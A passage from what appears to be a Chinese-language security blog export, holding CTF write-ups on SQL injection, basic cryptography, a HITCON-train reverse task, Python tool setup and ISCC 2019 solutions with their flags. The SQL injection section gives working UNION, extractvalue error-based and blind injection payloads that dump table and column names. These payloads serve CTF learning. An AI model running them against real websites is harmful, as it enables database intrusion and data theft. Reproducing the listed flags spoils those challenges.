(Xpath格式的字符串)。 同样的，extractvalue第二个参数需要的是Xpath格式的字符串。如果输入的不符合Xpath格式，将会发生错误。 32.php?id=1 and extractvalue(1,concat(0x7e,(select USER()),0x7e)) 练手题：bugku 成绩单 123456#构造过程id=-1&apos; union select 1,2,3,4# //爆出字段，发现四个都有回显id=-1&apos;union select 1,2,3,database()# //得到数据库的名字skctf_flagid=-1&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# //获取表名fl4g,scid=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&apos;fl4g&apos;# //获取行名skctf_flagid=-1&apos; union select 1,2,3,skctf_flag from fl4g# //读取字段类容 BUGKU{Sql_INJECT0N_4813drd8hz4} 盲注 页面不会返回查询结果 页面状态只有两种，真/假 基于布尔的盲注攻击 攻击者在参数中输入类似“用户名第一个字母是a么”这样的SQL语句，根据页面结果判断真假。如果为真，继续暴力破解第二个字母。如果为假，则更改条件，“用户名第一个字母是b么”，以此类推进行基于布尔的盲注攻击。 SUBSTRING(str,pos,len)，分别代表了被截取字符串、开始截取位置、截取长度。如果没有定义len，则截取至str末尾。pos可以为负值，意思为倒数第几位。 确定长度?id=1 and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())&lt;4 确定具体内容?id=1 and (select substring(group_concat(table_name),1,1) from information_schema.tables where table_schema=database())=‘a’ 基于时间的盲注 Sleep(5) benchmark(10000000,MD5(1))]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学基础]]></title>
    <url>%2F2019%2F07%2F24%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[密码学概述 密码：认证以及 保证通信信息的完整性、机密性 认证： 便于授权以及管理 机密性：为了防止信息被窃听，因此需要对信息进行加密，对应的密码技术主要就是对称加密和非对称加密。 完整性：为了防止信息被篡改，因此需要对信息进行完整性校验，对应的密码技术有单向散列函数、消息认证码、数字签名。 不可否认性：为了防止发送者发布信息后否认自己发布过，因此需要证据来证明信息是否由发送者发布，对应的密码技术为数字签名。 过程： 主要思想分组密码：设M为明文，分组密码将M划分为一系列明文块Mi，通常每块包含若干字符，并且对每一块Mi都用同一个密钥Ke进行加密。M=(M1,M2,…,Mn) ，C=(C1,C2 ,…,Cn,)，其中Ci=E(Mi,Ke)，i=1,2…,n。如：DES、AESd 序列密码：将明文和密钥都划分为位(bit)或字符的序列，并且对明文序列中的每一位或字符都用密钥序列中对应的分量来加密。M=(M1,M2,…,Mn) ，Ke=(ke1,ke2,…,ken)，C=(C1,C2,…,Cn)，其中Ci=E(mi,kei)，i=1,2,…,n。 如：RC4 古典密码单表替换密码 加密：将单表替换加密也是逐个字母地加密明文。在加密时，将会按照某种无序的对应规则，并按照这个规则将明文每个字母替换而得到密文。 解密：明文和密文没有明显联系，需要两个人都拿都表来对照。 较短的密码可以观察之后直接爆破，较长的密码可以进行频率分析。 凯撒密码 又称移位密码 就是将26个字母简单的移动位置 1234abcdefghijklmnopqrstuvwxyz--&gt;右移动两个位：yzabcdefghijklmnopqrstuvwx.....其他类似 加密结果只有26种，所以可以直接爆破(用python自己写脚本) 网上有很多在线解密网站，比如：http://ctf.ssleye.com/ 多表代换密码加密后字母不再保持原来的频率。 其他 base64编码，在CTF 中比较常见，base64编码后的字符串的长度一定会被4整除，包括用作后缀的等号吧；如果明文字符数不能被3整除，余1时，1个字符转为2个，补2个等号，共4个字符；余2时，2个字符转为3个字符，补1个等号，共4个字符 base64不仅可以编码字符串，也可以编码图片， 严格来说base64不能算是一种加密，只能说是编码转换，跟ASCII码与Unicode编码一样 http://imgbase64.duoshitong.com 栗子： 1RkxBR3tCSTdfMVNDXzZhYn0= 现代密码学椭圆曲线椭圆曲线加密算法，即：Elliptic Curve Cryptography，简称ECC，是基于椭圆曲线数学理论实现的一种非对称加密算法。相比RSA，ECC优势是可以使用更短的密钥，来实现与RSA相当或更高的安全。据研究，160位ECC加密安全性相当于1024位RSA加密，210位ECC加密安全性相当于2048位RSA加密。 椭圆曲线的一般方程为$$y^2 = x^3+ax^2+b^2+c$$ 判别式为$$\Delta (E) = -4a^3c+a^2b^2-4b^3-27c^2+18abc \neq 0$$比如下面这个图： 密码学中用到的椭圆曲线方程一般限定为$$y^2=x^3+ax+b，其中\Delta(E)=4a^3+27b^2 \neq 0$$ 定义椭圆曲线的运算规则 加法 过曲线上的两点A、B画一条直线，找到直线与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A+B，即为加法。如下图所示：A + B = C 二倍运算 此时上述直线与曲线相切，在这种情况下，将椭圆曲线在A点的切线，与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A + A，即2A，即为二倍运算。 正负取反A与-A,坐标相当于关于x轴对称 无穷远为单位元x A+（-A）=O 实数的椭圆曲线椭圆曲线加密解密原理由上述所定义的运算，我们知道，当给定一个点G时，已知一个数k求kG并不困难，但是已知kG我们想要求k却是非常困难。所以我们可以将k当作私钥，K=kG为公钥， 加密过程：选择一个随机数r，将消息M生成密文C，该密文是一个点对C={rG,M+rK} 解密过程：M+rK-k(rG)=M 椭圆曲线签名算法原理 私钥签名： 选择一个随机数r，计算点rG，G(x,y) 根据随机数r、消息M的hash值、私钥k，计算sig = (h+kx)/r (ps:有限域中的除运算都是求逆) 将消息M、和签名{rG,sig} 公钥验证签名： 接收方收到消息M、以及签名{rG, s} 根据消息求哈希h 使用发送方公钥K计算:hG/s+xK/s =rG 为什么需要hash???]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCON-train]]></title>
    <url>%2F2019%2F07%2F11%2FHITCON-train%2F</url>
    <content type="text"><![CDATA[lab1先看看保护机制 打开了部分可读，而就是可以进行溢出覆盖，打开了栈溢出保护，而且NX打开，不可执行，地址随机化没有打开 现在可以用ida打开看看文件，是32位的，所以就可以直接在ida.exe里面打开 找到mian函数，反编译以下： 看到关键函数get_flag(): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374v67 = __readgsdword(0x14u); v54 = 'y_oD'; v55 = 'k_uo'; v56 = '_won'; v57 = '_yhw'; v58 = 't_ym'; v59 = 'mmae'; v60 = '_eta'; v61 = 'narO'; v62 = 'i_eg'; v63 = 'os_s'; v64 = 'gna_'; v65 = '??yr'; v66 = '?'; v5 = 7; v6 = 59; v7 = 25; v8 = 2; v9 = 11; v10 = 16; v11 = 61; v12 = 30; v13 = 9; v14 = 8; v15 = 18; v16 = 45; v17 = 40; v18 = 89; v19 = 10; v20 = 0; v21 = 30; v22 = 22; v23 = 0; v24 = 4; v25 = 85; v26 = 22; v27 = 8; v28 = 31; v29 = 7; v30 = 1; v31 = 9; v32 = 0; v33 = 126; v34 = 28; v35 = 62; v36 = 10; v37 = 30; v38 = 11; v39 = 107; v40 = 4; v41 = 66; v42 = 60; v43 = 44; v44 = 91; v45 = 49; v46 = 85; v47 = 2; v48 = 30; v49 = 33; v50 = 16; v51 = 76; v52 = 30; v53 = 66; fd = open("/dev/urandom", 0); read(fd, &amp;buf, 4u); printf("Give me maigc :"); __isoc99_scanf("%d", &amp;v2); if ( buf == v2 ) &#123; for ( i = 0; i &lt;= 0x30; ++i ) putchar((char)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i))); &#125; return __readgsdword(0x14u) ^ v67;&#125; 根据这个可以直接进行逆向： 1234567#-*-encoding=utf-8-*-K = "Do_you_know_why_my_teammate_Orange_is_so_angry???"C = [7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66]print("sizeof(C):",len(C))print("sizeof(K):",len(K))for i in range(len(K)): print(chr(C[i]^ord(K[i])),end="") lab2]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python推荐工具]]></title>
    <url>%2F2019%2F05%2F19%2Fpython%E6%8E%A8%E8%8D%90%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Anaconda介绍Anaconda就是可以便捷获取包且对包能够进行管理，同时对环境可以统一管理的发行版本。Anaconda包含了conda、Python在内的超过180个科学包及其依赖项。 特点 开源 安装过程简单 高性能使用Python和R语言 免费的社区支持 独立的环境依赖，使得诸多比较难装的库可以直接安装 安装 下载链接： https://www.anaconda.com/ Python2.7还有不到一年就要退休了，所以如果你没有什么特殊的工作要求，python3.7就足够满足所有要求 下载下来，点击安装，顺着流程走： 到这一步可以不用选择配置环境变量，以便后面安装什么东西冲突，会出现奇怪的bug 然后一直安装到这,点击install vscode，一个比较好用的编辑器 安装好后，安装一个插件，就差不多可以直接用了 pycharm安装 下载链接：https://www.jetbrains.com/zh/pycharm/specials/pycharm/pycharm.html?utm_source=baidu&amp;utm_medium=cpc&amp;utm_campaign=cn-bai-br-pycharm-ex-pc&amp;utm_content=pycharm-pure&amp;utm_term=pycharm&amp;gclid=CIesutOLqOICFQMpvAodTg4HGA&amp;gclsrc=ds 一路next就行 需要激活的地方停一下 申请学生账号 点击buy Pycharm 填信息 然后等着确认一下就行 之后就可以用了 pycharm中使用anaconda部署python环境 参考网站：https://www.cnblogs.com/pejsidney/p/9216470.html]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>软件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019_ISCC]]></title>
    <url>%2F2019%2F05%2F19%2F2019-ISCC-Misc%2F</url>
    <content type="text"><![CDATA[隐藏的信息打开文件是一堆八进制码 10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 直接用python转成十进制，然后变为ASCII字符,脚本如下： 12345678910import re#openwith open('message.txt', 'r') as f1: s1 = f1.read() s1 = re.split(' ',s1) for i in s1[0:-1]: print(chr(int(i,8)),end='') f1.close()#V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K#base64解码：ISCC&#123;N0_0ne_can_st0p_y0u&#125; Welcome下载得到一个名为zip的文件，不可打开，看看文件类型 是一个压缩包文件，然后可以解压出50张二维码，发现一个jpg为其他都是png，查看文件二进制信息即可得到flag 1#flag&#123;15cC9012&#125; 提交格式应该是 15cC9012 碎纸机下载得到一个压缩包文件，可以直接解压，得到一个图片 真的是一个碎纸机，先看看文件类型 用binwalk查看一下是否图片里藏有其他文件： 用binwalk -e 平平无奇的碎纸机.jpg分离出文件，得到一些拼图和一个文档 再看看文本里的内容： 碎纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？我去问了欧鹏·曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。 看起来是需要我们去里面得到相应的信息，可以需要拼图，对二进制进行操作，用winhex打开 现在就看有没有什么规律啥的，翻到最后，发现一个乱码是独立的而且就是由0和F组成，所以将其复制出来，在vscode中打开，然后查找0，可以得到 其他几个文件也是类似，这里就不做赘述，所以flag为：Flag={ISCC_is_so_interesting_!} 解密成绩单ISCC{Y0u_F0UnD_ThE_P4SSW0RD!} REV02flag{ST0RING_STAT1C_PA55WORDS_1N_FIL3S_1S_N0T_S3CUR3} REV03FLAG{I_LOVE_FONZY} Web5flag{1SCC_2OI9} Mobile1234567836275184 pwn02flag{2c9c6bd8-c285-43b7-ac8a-f74eb9a7cb2f} pwn01flag{f530c5ef-3a8a-4271-91f7-3c5ebd87fbe4} rev4http://ISCC2019{url_seems_rotten_with}ctf.com]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ISCC</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
